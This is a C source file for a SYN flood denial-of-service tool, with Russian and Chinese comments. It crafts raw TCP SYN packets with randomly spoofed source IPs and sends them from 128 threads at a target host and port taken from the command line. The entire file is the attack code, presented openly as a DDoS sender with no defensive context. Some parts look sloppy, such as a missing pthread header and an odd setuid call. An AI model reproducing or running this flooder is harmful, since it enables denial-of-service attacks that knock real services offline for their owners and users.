#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>

/* количество потоков по умолчанию */
#define MAXCHILD 128
#define BUF_SIZE 100

int raw_sock = 0;
static int alive = -1;

char dst_ip[20] = { 0 };
int dst_port;

typedef struct ip_hdr {
	unsigned char       hl;
	unsigned char       tos;
	unsigned short      total_len;
	unsigned short      id;
	unsigned short      frag_and_flags;
	unsigned char       ttl;
	unsigned char       proto;
	unsigned short      checksum;
	unsigned int        src_ip;
	unsigned int        dest_ip;
} ip_hdr;

typedef struct tcp_hdr {
 	unsigned short      src_port;
 	unsigned short      dest_port;
	unsigned int        seq;
	unsigned int        ack;
	unsigned char       lenres;
 	unsigned char       flag;
	unsigned short      win;
	unsigned short      sum;
	unsigned short      urp;
} tcp_hdr;

typedef struct fake_hdr {
	unsigned int 		src_addr;
	unsigned int 		dest_addr;
	char				zero;
	char				protocol;
	unsigned short		len;
} fake_hdr;

unsigned short checksum(unsigned short *ptr, int n_bytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum = 0;
    while (n_bytes > 1) {
        sum += *ptr++;
        n_bytes -= 2;
    }

    if (n_bytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16)+(sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
     
    return answer;
}

void init_header(ip_hdr *ip, tcp_hdr *tcp, fake_hdr *fake)
{
  int len = sizeof(ip_hdr) + sizeof(tcp_hdr);
	/* IP заполняем заголовок */
	ip->hl = (4<<4 | sizeof(ip_hdr)/sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	ip->checksum = 0;
	ip->src_ip = 0;
	ip->dest_ip = inet_addr(dst_ip);

	/* ТСР заполняем заголовок */
	tcp->src_port = htons( rand()%16383 + 49152 );
	tcp->dest_port = htons(dst_port);
	tcp->seq = htonl( rand()%90000000 + 2345 ); 
	tcp->ack = 0; 
	tcp->lenres = (sizeof(tcp_hdr) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons (2048);  
	tcp->sum = 0;
	tcp->urp = 0;

	/* TCP псевдо заголовок */
	fake->zero = 0;
	fake->protocol = IPPROTO_TCP;
	fake->len = htons(sizeof(tcp_hdr));
	fake->dest_addr = inet_addr(dst_ip);
	srand((unsigned) time(NULL));
}

void send_ddos_packet(struct sockaddr_in *addr)
{ 
	char buf[BUF_SIZE];
	char sendbuf[BUF_SIZE];
	int len;
	ip_hdr ip;
	tcp_hdr tcp;
	fake_hdr fake;

	len = sizeof(ip) + sizeof(tcp_hdr);
  
	init_header(&ip, &tcp, &fake);
  
	while(alive) {
    	ip.src_ip = rand();

    memset(buf, '\0', sizeof(buf));
    memcpy(buf , &ip, sizeof(ip));
    ip.checksum = checksum((u_short *) buf, sizeof(ip));

    fake.src_addr = ip.src_ip;

    memset(buf, '\0', sizeof(buf));
    memcpy(buf , &fake, sizeof(fake_hdr));
    memcpy(buf + sizeof(fake_hdr), &tcp, sizeof(tcp_hdr));
    tcp.sum = checksum((u_short *) buf, sizeof(fake_hdr) + sizeof(tcp_hdr));

    memset(sendbuf, '\0', sizeof(sendbuf));
    memcpy(sendbuf, &ip, sizeof(ip));
    memcpy(sendbuf + sizeof(ip), &tcp, sizeof(tcp_hdr));
    printf("ddos packet");

    if (sendto(raw_sock, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
      perror("sendto()");
      pthread_exit("fail");
    }
    sleep(1);
}
}

void sig_int(int signo)
{
  alive = 0;
}

int main(int argc, char *argv[])
{
	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	int i = 0;
	int err = -1;
	pthread_t pthread[MAXCHILD];

	alive = 1;
	/* CTRL+C */
	signal(SIGINT, sig_int);

	strncpy(dst_ip, argv[1], 16);
	dst_port = atoi(argv[2]);

	memset(&addr, '\0', sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if (inet_addr(dst_ip) == INADDR_NONE) {
    /* 为DNS地址，查询并转换成IP地址 */
    host = gethostbyname(argv[1]);
    if(host == NULL) {
      perror("gethostbyname()");
      exit(1);
    }
	addr.sin_addr = *((struct in_addr*)(host->h_addr));
    strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
} else {
    addr.sin_addr.s_addr = inet_addr(dst_ip);
}

if (dst_port < 0 || dst_port > 65535) {
    printf("Port Error\n");
    exit(1);
}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	raw_sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (raw_sock < 0) {
		perror("socket()");
		exit(1);
}

	if (setsockopt (raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0) {
		perror("setsockopt()");
		exit(1);
}

	setuid(getpid());

	for(i = 0; i < MAXCHILD; i++) {
		err = pthread_create(&pthread[i], NULL, send_ddos_packet, &addr);
    
    	if(err != 0) {
			perror("pthread_create()");
			exit(1);
		}
	}

	for(i = 0; i < MAXCHILD; i++) {
    	err = pthread_join(pthread[i], NULL);
    	if(err != 0) {
			perror("pthread_join Error\n");
			exit(1);
		}
	}

	close(raw_sock);

	return 0;
}
